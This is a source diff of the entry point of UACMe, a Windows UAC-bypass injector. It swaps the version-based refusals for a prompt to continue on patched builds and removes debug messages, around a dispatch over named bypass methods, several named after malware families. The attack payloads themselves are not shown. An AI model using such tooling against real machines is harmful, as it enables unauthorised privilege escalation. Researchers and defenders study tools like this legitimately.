@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.91
+*  VERSION:     1.92
 *
-*  DATE:        12 Oct 2015
+*  DATE:        14 Oct 2015
 *
 *  Injector entry point.
 *
@@ -46,16 +46,10 @@ ELOAD_PARAM_GLOBAL g_ldp;
 #define PROGRAMTITLE TEXT("UACMe")
 #define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
 This is not supported, run x64 version of this tool.")
-#define WINPRE10 TEXT("This method is only for Windows 7/8/8.1")
-#define WINPREBLUE TEXT("This method is only for pre Windows 8.1 use")
-#define WINBLUEONLY TEXT("This method is only for Windows 8.1 use")
-#define WIN10ONLY TEXT("This method is only for Windows 10 use")
 #define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")
 #define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")
 
-#define UACFIX_10136 TEXT("Fixed in Windows builds >= 10136")
-#define UACFIX_10147 TEXT("Fixed in Windows builds >= 10147")
-#define UACFIX_10548 TEXT("Fixed in Windows builds >= 10548")
+#define UACFIX TEXT("This method fixed/unavailable in the current version of Windows, do you still want to continue?")
 
 /*
 * ucmShowMessage
@@ -66,14 +60,30 @@ This is not supported, run x64 version of this tool.")
 *
 */
 VOID ucmShowMessage(
-	LPTSTR lpszMsg
+	LPWSTR lpszMsg
 	)
 {
 	if (lpszMsg) {
-		MessageBox(GetDesktopWindow(), 
+		MessageBoxW(GetDesktopWindow(), 
 			lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
 	}
 }
+
+/*
+* ucmShowQuestion
+*
+* Purpose:
+*
+* Output message with question to user.
+*
+*/
+INT ucmShowQuestion(
+	LPWSTR lpszMsg
+	)
+{
+	return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_YESNO);
+}
+
 
 /*
 * ucmInit
@@ -174,44 +184,39 @@ UINT ucmMain()
 	dwType = strtoul(szBuffer);
 	switch (dwType) {
 
-	case METHOD_SYSPREP1:
-		OutputDebugString(TEXT("[UCM] Sysprep cryptbase\n\r"));
+	case METHOD_SYSPREP1://cryptbase
 		if (g_ldp.osver.dwBuildNumber > 9200) {
-			ucmShowMessage(WINPREBLUE);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_SYSPREP2:
-		OutputDebugString(TEXT("[UCM] Sysprep shcore\n\r"));
-		if (g_ldp.osver.dwBuildNumber < 9600) {
-			ucmShowMessage(WINBLUEONLY);
-			return ERROR_UNSUPPORTED_TYPE;
+	case METHOD_SYSPREP2://shcore
+		if (g_ldp.osver.dwBuildNumber != 9600) {
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_SYSPREP3:
-		OutputDebugString(TEXT("[UCM] Sysprep dbgcore\n\r"));
-		if (g_ldp.osver.dwBuildNumber < 10000) {
-			ucmShowMessage(WIN10ONLY);
-			return ERROR_UNSUPPORTED_TYPE;
+	case METHOD_SYSPREP3://dbgcore
+		if (g_ldp.osver.dwBuildNumber != 10240)	{
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_OOBE:
+	case METHOD_OOBE://oobe service
 		if (g_ldp.osver.dwBuildNumber >= 10548) {
-			ucmShowMessage(UACFIX_10548);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] Oobe\n\r"));
 		break;
 
 	case METHOD_REDIRECTEXE:
 		if (g_ldp.osver.dwBuildNumber > 9600) {
-			ucmShowMessage(WINPRE10);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] AppCompat RedirectEXE\n\r"));
 
 #ifdef _WIN64
 		ucmShowMessage(WOW64WIN32ONLY);
@@ -221,59 +226,51 @@ UINT ucmMain()
 
 	case METHOD_SIMDA:
 		if (g_ldp.osver.dwBuildNumber >= 10136) {
-			ucmShowMessage(UACFIX_10136);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] Simda\n\r"));
 		break;
 
 	case METHOD_CARBERP:
 		if (g_ldp.osver.dwBuildNumber >= 10147) {
-			ucmShowMessage(UACFIX_10147);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] Carberp\n\r"));
 		break;
 
 	case METHOD_CARBERP_EX:
 		if (g_ldp.osver.dwBuildNumber >= 10147) {
-			ucmShowMessage(UACFIX_10147);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] Carberp_ex\n\r"));
 		break;
 
 	case METHOD_TILON:
-		OutputDebugString(TEXT("[UCM] Tilon\n\r"));
 		if (g_ldp.osver.dwBuildNumber > 9200) {
-			ucmShowMessage(WINPREBLUE);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
 	case METHOD_AVRF:
 		if (g_ldp.osver.dwBuildNumber >= 10136) {
-			ucmShowMessage(UACFIX_10136);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] AVrf\n\r"));
 		break;
 
 	case METHOD_WINSAT:
 		if (g_ldp.osver.dwBuildNumber >= 10548) {
-			ucmShowMessage(UACFIX_10548);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] WinSAT\n\r"));
 		break;
 
 	case METHOD_SHIMPATCH:
 		if (g_ldp.osver.dwBuildNumber > 9600) {
-			ucmShowMessage(WINPRE10);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-
-		OutputDebugString(TEXT("[UCM] AppCompat Shim Patch\n\r"));
 
 #ifdef _WIN64
 		ucmShowMessage(WOW64WIN32ONLY);
@@ -282,17 +279,14 @@ UINT ucmMain()
 		break;
 
 	case METHOD_MMC:
-		OutputDebugString(TEXT("[UCM] MMC \n\r"));
 		break;
 
 	case METHOD_H1N1:
 		if (g_ldp.osver.dwBuildNumber >= 10548) {
-			ucmShowMessage(UACFIX_10548);
-			return ERROR_UNSUPPORTED_TYPE;
+			if (ucmShowQuestion(UACFIX) == IDNO)
+				return ERROR_UNSUPPORTED_TYPE;
 		}
-		OutputDebugString(TEXT("[UCM] H1N1 \n\r"));
 		break;
-
 	}
 
 	//prepare command for payload
@@ -363,11 +357,6 @@ UINT ucmMain()
 	case METHOD_CARBERP_EX:
 
 		if (dwType == METHOD_CARBERP) {
-
-			if (g_ldp.osver.dwBuildNumber > 9600) {
-				ucmShowMessage(WINPRE10);
-				return ERROR_UNSUPPORTED_TYPE;
-			}
 
 			//there is no migmiz in syswow64 in 8+
 			if ((g_ldp.IsWow64) && (g_ldp.osver.dwBuildNumber > 7601)) {
